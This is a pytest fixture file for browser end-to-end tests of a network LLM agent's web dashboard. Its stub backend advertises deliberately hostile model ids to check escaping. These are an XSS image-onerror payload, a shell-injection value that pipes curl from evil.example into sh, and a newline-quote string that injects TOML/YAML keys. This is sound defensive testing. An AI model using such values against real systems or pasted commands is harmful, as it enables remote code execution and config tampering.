"""Browser end-to-end fixtures for the web dashboard.

These drive the *real* agent in a real browser: a uvicorn server on an
ephemeral port serving `create_app(cfg)`, with an optional stub
OpenAI-compatible backend so `/v1/models` and the status payload carry
something to render. Nothing here mocks the dashboard's own fetches — if a
page renders, it rendered against the actual HTTP surface.

Requires the chromium browser binary:  uv run playwright install chromium
"""

from __future__ import annotations

import socket
import threading
import time
from collections.abc import Iterator
from dataclasses import dataclass
from pathlib import Path

import httpx
import pytest
import uvicorn
from fastapi import FastAPI
from netllm_agent.app import create_app
from netllm_core.models import BackendOverride, NetllmConfig, save_config

ROOT = Path(__file__).resolve().parents[2]

# The dashboard polls status/telemetry on timers, so `networkidle` never settles
# on CI runners under load. Wait for the first refresh() to finish instead —
# `#page-overview h1` exists earlier with "Still contacting the agent…".
# First load calls loadCore(deepStatus=true), which may probe every backend for
# up to API_DEEP_TIMEOUT_MS (60s) before firstLoadComplete flips.
DASHBOARD_READY = "() => state.firstLoadComplete === true && state.configDraft !== null"
DASHBOARD_READY_TIMEOUT_MS = 90_000


def _chromium_missing() -> str:
    """Reason to skip, or "" when a chromium build is installed.

    `scripts/ci.sh test` runs `pytest tests/`, which sweeps this directory. A
    bare runner has no browser binary, and pytest-playwright's `browser`
    fixture raises rather than skipping — which would turn every job red for a
    missing optional dependency. `ci.sh e2e` installs chromium and runs these
    for real; everywhere else they skip with this reason.
    """
    try:
        from playwright.sync_api import sync_playwright
    except ImportError:  # pragma: no cover - dev extra not installed
        return "playwright is not installed"
    try:
        with sync_playwright() as p:
            path = p.chromium.executable_path
    except Exception as exc:  # pragma: no cover - driver unavailable
        return f"playwright driver unavailable: {exc}"
    if not path or not Path(path).exists():
        return "chromium is not installed — run: uv run playwright install chromium"
    return ""


def pytest_collection_modifyitems(items: list[pytest.Item]) -> None:
    """Mark this directory `browser`, and skip it when chromium is absent.

    The marker is applied here rather than per-file so a new test in this
    directory cannot forget it — and forgetting it is not a small mistake:
    an unmarked browser test is collected into the default run, where
    Playwright's sync API and `asyncio_mode = "auto"` leave a running event
    loop behind that breaks every later async test in the session.
    """
    here = Path(__file__).parent
    reason = _chromium_missing()
    skip = pytest.mark.skip(reason=reason) if reason else None
    for item in items:
        if Path(str(item.fspath)).parent != here:
            continue
        item.add_marker(pytest.mark.browser)
        if skip is not None:
            item.add_marker(skip)


def _free_port() -> int:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(("127.0.0.1", 0))
        return int(s.getsockname()[1])


@dataclass
class RunningServer:
    base_url: str
    server: uvicorn.Server
    thread: threading.Thread


def _serve(app: object, port: int) -> RunningServer:
    config = uvicorn.Config(
        app,  # pyright: ignore[reportArgumentType]
        host="127.0.0.1",
        port=port,
        log_level="warning",
        lifespan="on",
    )
    server = uvicorn.Server(config)
    thread = threading.Thread(target=server.run, daemon=True)
    thread.start()
    base_url = f"http://127.0.0.1:{port}"
    deadline = time.time() + 30
    while time.time() < deadline:
        if server.started:
            return RunningServer(base_url, server, thread)
        time.sleep(0.05)
    raise RuntimeError(f"server on {port} did not start")


def _shutdown(running: RunningServer) -> None:
    running.server.should_exit = True
    running.thread.join(timeout=10)


def _stub_backend_app(models: list[str]) -> FastAPI:
    """Minimal OpenAI-compatible upstream, enough for discovery + /v1/models.

    Model ids include deliberately hostile strings so every page that renders
    a model id is exercised against injection in the normal test path, not
    only in the dedicated security tests.
    """
    app = FastAPI()

    @app.get("/v1/models")
    def list_models() -> dict[str, object]:
        return {
            "object": "list",
            "data": [{"id": m, "object": "model", "owned_by": "stub"} for m in models],
        }

    @app.get("/health")
    def health() -> dict[str, str]:
        return {"status": "ok"}

    return app


HOSTILE_MODEL_ID = "<img src=x onerror=alert(1)>evil:7b"

# The other half of the model-id threat: a LAN peer publishes this through its
# health.models, swarm.py republishes it via /v1/models, and the dashboard puts
# it in a command the user is told to paste into a shell. Unquoted, it is three
# commands; the quoting tests below assert it stays one word.
SHELL_HOSTILE_MODEL_ID = "pwn'; curl http://evil.example/x | sh; echo '"

# The config-snippet variant: a `"` plus a newline closes a TOML basic string
# and a YAML double-quoted scalar, so an unescaped id writes arbitrary extra
# keys into a file the dashboard tells the user to paste.
CONFIG_HOSTILE_MODEL_ID = 'quote"break\nmalicious = true\nx'

DEFAULT_STUB_MODELS = [
    "gemma4:27b",
    "qwen3.5-35b",
    "bge-m3",
    HOSTILE_MODEL_ID,
    SHELL_HOSTILE_MODEL_ID,
    CONFIG_HOSTILE_MODEL_ID,
]


@pytest.fixture(scope="session")
def stub_backend() -> Iterator[RunningServer]:
    running = _serve(_stub_backend_app(DEFAULT_STUB_MODELS), _free_port())
    try:
        yield running
    finally:
        _shutdown(running)


@pytest.fixture
def agent_config(
    tmp_path: Path, stub_backend: RunningServer
) -> tuple[NetllmConfig, Path]:
    """A config with the stub wired in as a backend, mDNS/advertise off."""
    cfg = NetllmConfig()
    cfg.swarm.mdns = False
    cfg.agent.advertise = False
    cfg.agent.hostname = "e2e-host"
    cfg.routing.backends = [
        BackendOverride(
            base_url=f"{stub_backend.base_url}/v1",
            provider="custom",
            enabled=True,
            local=True,
        )
    ]
    cfg_path = tmp_path / "config.toml"
    save_config(cfg, cfg_path)
    return cfg, cfg_path


@pytest.fixture
def agent(agent_config: tuple[NetllmConfig, Path]) -> Iterator[RunningServer]:
    """The real agent, serving /ui/ and the full API."""
    cfg, cfg_path = agent_config
    app = create_app(cfg, config_path=cfg_path)
    running = _serve(app, _free_port())
    # Fail fast and loudly if the agent itself is unhealthy — otherwise every
    # browser assertion below fails with a confusing empty-page message.
    resp = httpx.get(f"{running.base_url}/health", timeout=10)
    resp.raise_for_status()
    try:
        yield running
    finally:
        _shutdown(running)


@pytest.fixture
def empty_agent(tmp_path: Path) -> Iterator[RunningServer]:
    """An agent with no backends and no peers — the empty-state path."""
    cfg = NetllmConfig()
    cfg.swarm.mdns = False
    cfg.agent.advertise = False
    cfg_path = tmp_path / "config.toml"
    save_config(cfg, cfg_path)
    app = create_app(cfg, config_path=cfg_path)
    running = _serve(app, _free_port())
    try:
        yield running
    finally:
        _shutdown(running)


@pytest.fixture
def dash(page, agent: RunningServer):  # noqa: ANN001, ANN201 - playwright types
    """A browser page on the dashboard, with console errors captured.

    `dash.console_errors` is asserted empty by most tests: a JS exception in
    any page renderer is a test failure, not a silent degradation.
    """
    errors: list[str] = []
    page.on(
        "console",
        lambda msg: errors.append(msg.text) if msg.type == "error" else None,
    )
    page.on("pageerror", lambda exc: errors.append(str(exc)))
    page.goto(f"{agent.base_url}/ui/", wait_until="load")
    page.wait_for_function(DASHBOARD_READY, timeout=DASHBOARD_READY_TIMEOUT_MS)
    page.console_errors = errors  # type: ignore[attr-defined]
    page.agent_base_url = agent.base_url  # type: ignore[attr-defined]
    return page
